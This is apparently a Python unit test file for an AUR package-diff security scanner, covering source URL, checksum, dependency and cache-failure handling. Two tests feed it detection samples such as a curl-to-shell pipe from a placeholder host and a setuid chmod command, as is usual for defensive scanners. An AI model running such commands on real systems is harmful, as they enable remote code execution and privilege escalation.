from __future__ import annotations

import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from aur_diff_sentinel.cache import BASELINE_VERSION_FILE, AurCache
from aur_diff_sentinel.models import Severity
from aur_diff_sentinel.provider import AurUpdate
from aur_diff_sentinel.report import format_findings
from aur_diff_sentinel.scanner import scan_diff_text, scan_text


def _replacement_diff(old: str, new: str, *, filename: str = "PKGBUILD") -> str:
    return "\n".join(
        [
            f"--- a/{filename}",
            f"+++ b/{filename}",
            "@@ -1 +1 @@",
            f"-{old}",
            f"+{new}",
        ]
    )


def _diff_section(
    *body: str,
    filename: str = "PKGBUILD",
    hunk: str = "@@ -1 +1 @@",
    new_file: bool = False,
) -> str:
    return "\n".join(
        [
            f"diff --git a/{filename} b/{filename}",
            "--- /dev/null" if new_file else f"--- a/{filename}",
            f"+++ b/{filename}",
            hunk,
            *body,
        ]
    )


class RefactorRegressionTests(unittest.TestCase):
    def test_prepended_source_url_is_not_paired_with_existing_urls(self) -> None:
        diff = _replacement_diff(
            "source=('https://one.example/a' 'https://two.example/b')",
            "source=('https://new.example/n' 'https://one.example/a' 'https://two.example/b')",
        )

        source_findings = [
            finding for finding in scan_diff_text(diff) if finding.rule_id.startswith("source-")
        ]

        self.assertEqual([finding.rule_id for finding in source_findings], ["source-url-added"])
        self.assertEqual(source_findings[0].new_value, "https://new.example/n")

    def test_source_urls_are_never_paired_across_pkgbuild_files(self) -> None:
        diff = "\n".join(
            [
                "diff --git a/pkg1/PKGBUILD b/pkg1/PKGBUILD",
                "--- /dev/null",
                "+++ b/pkg1/PKGBUILD",
                "@@ -0,0 +1 @@",
                "+source=('https://added.example/a')",
                "diff --git a/pkg2/PKGBUILD b/pkg2/PKGBUILD",
                "--- a/pkg2/PKGBUILD",
                "+++ b/pkg2/PKGBUILD",
                "@@ -1 +1 @@",
                "-source=('https://old.example/b')",
                "+source=('https://new.example/b')",
            ]
        )

        source_findings = [
            finding for finding in scan_diff_text(diff) if finding.rule_id.startswith("source-")
        ]

        self.assertEqual(
            [(finding.filename, finding.rule_id) for finding in source_findings],
            [
                ("pkg1/PKGBUILD", "source-url-added"),
                ("pkg2/PKGBUILD", "source-domain-changed"),
            ],
        )

    def test_aliased_source_url_domain_change_is_detected(self) -> None:
        diff = _replacement_diff(
            "source=('asset.tar.gz::https://old.example/a')",
            "source=('asset.tar.gz::https://new.example/a')",
        )

        findings = scan_diff_text(diff)

        self.assertIn("source-domain-changed", {finding.rule_id for finding in findings})

    def test_quoted_parentheses_do_not_break_full_pkgbuild_array_parsing(self) -> None:
        text = "\n".join(
            [
                "source=('git+https://example.com/repo.git#tag=(v1)')",
                "sha256sums=('SKIP')",
            ]
        )

        finding = next(finding for finding in scan_text(text) if finding.rule_id == "checksum-skip")

        self.assertEqual(finding.severity, Severity.MEDIUM)

    def test_incremental_checksum_arrays_use_effective_source_indexes(self) -> None:
        cases = (
            (
                "archive-appended-after-vcs",
                "source",
                "sha256sums",
                "git+https://example.invalid/repo.git",
                "https://example.invalid/archive.tar.gz",
                Severity.HIGH,
            ),
            (
                "vcs-appended-after-archive",
                "source",
                "sha256sums",
                "https://example.invalid/archive.tar.gz",
                "git+https://example.invalid/repo.git",
                Severity.MEDIUM,
            ),
            (
                "architecture-specific",
                "source_x86_64",
                "sha256sums_x86_64",
                "https://example.invalid/archive.tar.gz",
                "git+https://example.invalid/repo.git",
                Severity.MEDIUM,
            ),
        )
        for name, source_name, checksum_name, first_source, second_source, severity in cases:
            with self.subTest(name=name):
                text = "\n".join(
                    [
                        f"{source_name}=('{first_source}')",
                        f"{source_name}+=('{second_source}')",
                        f"{checksum_name}=('abc')",
                        f"{checksum_name}+=('SKIP')",
                    ]
                )

                findings = [finding for finding in scan_text(text) if finding.rule_id == "checksum-skip"]

                self.assertEqual(len(findings), 1)
                self.assertEqual(findings[0].severity, severity)
                self.assertEqual(findings[0].line_number, 4)

    def test_reassigned_arrays_only_analyze_the_final_effective_state(self) -> None:
        text = "\n".join(
            [
                "source=('https://example.invalid/archive.tar.gz')",
                "sha256sums=('SKIP')",
                "source=('git+https://example.invalid/repo.git')",
                "sha256sums=('abc')",
            ]
        )

        self.assertNotIn("checksum-skip", {finding.rule_id for finding in scan_text(text)})

    def test_dependency_diff_values_keep_added_and_removed_metadata(self) -> None:
        changed = _replacement_diff("depends=(foo bar)", "depends=(foo baz)")
        findings = scan_diff_text(changed)
        added = next(finding for finding in findings if finding.rule_id == "dependency-added")
        removed = next(finding for finding in findings if finding.rule_id == "dependency-removed")

        self.assertEqual((added.change_type, added.old_value, added.new_value), ("added", None, "baz"))
        self.assertEqual((removed.change_type, removed.old_value, removed.new_value), ("removed", "bar", None))

        moved = "\n".join(
            [
                _diff_section(
                    "-makedepends=(bar)",
                    "+makedepends=()",
                    "-depends=(foo)",
                    "+depends=(foo bar)",
                    hunk="@@ -1,2 +1,2 @@",
                )
            ]
        )
        moved_finding = next(finding for finding in scan_diff_text(moved) if finding.rule_id == "dependency-moved")
        self.assertEqual(moved_finding.change_type, "added")

    def test_pkgbuild_state_is_isolated_in_aggregated_diffs(self) -> None:
        removal = _diff_section(
            "-sha256sums=('abc')",
            "+# checksums removed",
            filename="pkg1/PKGBUILD",
        )
        unrelated_checksum = _diff_section(
            " sha256sums=('def')",
            filename="pkg2/PKGBUILD",
        )
        findings = scan_diff_text("\n".join([removal, unrelated_checksum]))
        removed = [finding for finding in findings if finding.rule_id == "checksum-array-removed"]
        self.assertEqual([(finding.filename, finding.change_type) for finding in removed], [("pkg1/PKGBUILD", "removed")])

        cross_source = "\n".join(
            [
                _diff_section(
                    " source=('git+https://example.invalid/repo.git')",
                    filename="pkg1/PKGBUILD",
                ),
                _replacement_diff(
                    "sha256sums=('abc')",
                    "sha256sums=('SKIP')",
                    filename="pkg2/PKGBUILD",
                ),
            ]
        )
        skip = next(finding for finding in scan_diff_text(cross_source) if finding.rule_id == "checksum-skip-added")
        self.assertEqual((skip.filename, skip.severity), ("pkg2/PKGBUILD", Severity.HIGH))

    def test_dependency_state_and_composites_are_scoped_to_one_package(self) -> None:
        first = _replacement_diff("depends=(foo)", "depends=(foo bar)", filename="pkg1/PKGBUILD")
        second = _replacement_diff("depends=(bar baz)", "depends=(baz)", filename="pkg2/PKGBUILD")
        findings = scan_diff_text("\n".join([first, second]))
        self.assertEqual(
            [(finding.filename, finding.rule_id) for finding in findings if finding.rule_id.startswith("dependency-")],
            [("pkg1/PKGBUILD", "dependency-added"), ("pkg2/PKGBUILD", "dependency-removed")],
        )

        risk_in_other_package = _replacement_diff(
            "source=('https://old.example/archive.tar.gz')",
            "source=('https://new.example/archive.tar.gz')",
            filename="pkg2/PKGBUILD",
        )
        ids = {
            finding.rule_id
            for finding in scan_diff_text("\n".join([first, risk_in_other_package]))
        }
        self.assertNotIn("dependency-with-risk-signals", ids)

        same_package_script = _diff_section(
            "+#!/bin/sh",
            filename="pkg1/scripts/example.install",
            hunk="@@ -0,0 +1 @@",
            new_file=True,
        )
        ids = {
            finding.rule_id
            for finding in scan_diff_text("\n".join([first, same_package_script]))
        }
        self.assertIn("dependency-with-risk-signals", ids)

        root_dependency = _replacement_diff("depends=(foo)", "depends=(foo bar)")
        nested_pkgbuild = _diff_section(
            " pkgname=second-package",
            filename="pkg2/PKGBUILD",
        )
        nested_script = _diff_section(
            "+#!/bin/sh",
            filename="pkg2/scripts/example.install",
            hunk="@@ -0,0 +1 @@",
            new_file=True,
        )
        ids = {
            finding.rule_id
            for finding in scan_diff_text(
                "\n".join([root_dependency, nested_pkgbuild, nested_script])
            )
        }
        self.assertNotIn("dependency-with-risk-signals", ids)

    def test_srcinfo_dependency_changes_do_not_cancel_across_packages(self) -> None:
        removed = _diff_section(
            "-depends = shared-dependency",
            filename="pkg1/.SRCINFO",
            hunk="@@ -1 +0,0 @@",
        )
        added = _diff_section(
            "+depends = shared-dependency",
            filename="pkg2/.SRCINFO",
            hunk="@@ -0,0 +1 @@",
            new_file=True,
        )

        findings = scan_diff_text("\n".join([removed, added]))
        matching = [finding for finding in findings if finding.rule_id == "dependency-added"]

        self.assertEqual([(finding.filename, finding.new_value) for finding in matching], [("pkg2/.SRCINFO", "shared-dependency")])

    def test_non_executed_command_text_does_not_produce_high_findings(self) -> None:
        samples = (
            "true # curl https://example.invalid/x | sh",
            "echo 'curl https://example.invalid/x | sh'",
            "printf 'chmod 4755 /tmp/example'",
        )

        for sample in samples:
            with self.subTest(sample=sample):
                self.assertEqual(scan_text(sample), [])

    def test_real_remote_shell_and_setuid_commands_remain_detected(self) -> None:
        samples = {
            "curl https://example.invalid/x | sh": "curl-pipe-shell",
            "bash -c 'curl https://example.invalid/x | sh'": "curl-pipe-shell",
            "chmod 4755 /usr/bin/example": "setuid-permission",
        }

        for sample, rule_id in samples.items():
            with self.subTest(sample=sample):
                self.assertIn(rule_id, {finding.rule_id for finding in scan_text(sample)})

    def test_diff_report_orders_findings_by_location_within_severity(self) -> None:
        diff = "\n".join(
            [
                "--- a/PKGBUILD",
                "+++ b/PKGBUILD",
                "@@ -1,2 +1,2 @@",
                "-sha256sums=('abc')",
                "+sha256sums=('SKIP')",
                "-pkgver=1",
                "+eval flags",
            ]
        )

        high_lines = [
            line for line in format_findings(scan_diff_text(diff)).splitlines() if line.startswith("-")
        ]

        self.assertIn("PKGBUILD:1", high_lines[0])
        self.assertIn("PKGBUILD:2", high_lines[1])


class CacheReplacementTests(unittest.TestCase):
    def test_failed_fetch_preserves_previous_latest_tree(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)

            def failing_fetcher(_update: AurUpdate, target: Path) -> None:
                target.mkdir(parents=True)
                (target / "PKGBUILD").write_text("partial", encoding="utf-8")
                raise RuntimeError("fetch failed")

            cache = AurCache(root, fetcher=failing_fetcher)
            latest = cache.latest_dir("example-bin")
            latest.mkdir(parents=True)
            (latest / "PKGBUILD").write_text("previous", encoding="utf-8")

            with self.assertRaisesRegex(RuntimeError, "fetch failed"):
                cache.fetch_latest(AurUpdate("example-bin", "1.0-1", "1.1-1"))

            self.assertEqual((latest / "PKGBUILD").read_text(encoding="utf-8"), "previous")
            self.assertEqual(list(latest.parent.glob(".example-bin-*")), [])

    def test_failed_refresh_preserves_previous_baseline_tree(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            cache = AurCache(root)
            baseline = cache.baseline_dir("example-bin")
            latest = cache.latest_dir("example-bin")
            baseline.mkdir(parents=True)
            latest.mkdir(parents=True)
            (baseline / "PKGBUILD").write_text("previous", encoding="utf-8")
            (baseline / BASELINE_VERSION_FILE).write_text("1.0-1", encoding="utf-8")
            (latest / "PKGBUILD").write_text("new", encoding="utf-8")

            with patch(
                "aur_diff_sentinel.cache.copy_metadata_tree",
                side_effect=OSError("copy failed"),
            ), self.assertRaisesRegex(RuntimeError, "copy failed"):
                cache.refresh_baseline(
                    AurUpdate("example-bin", "1.0-1", "1.1-1"),
                    latest,
                )

            self.assertEqual((baseline / "PKGBUILD").read_text(encoding="utf-8"), "previous")
            self.assertEqual(cache.baseline_version("example-bin"), "1.0-1")
            self.assertEqual(list(baseline.parent.glob(".example-bin-*")), [])
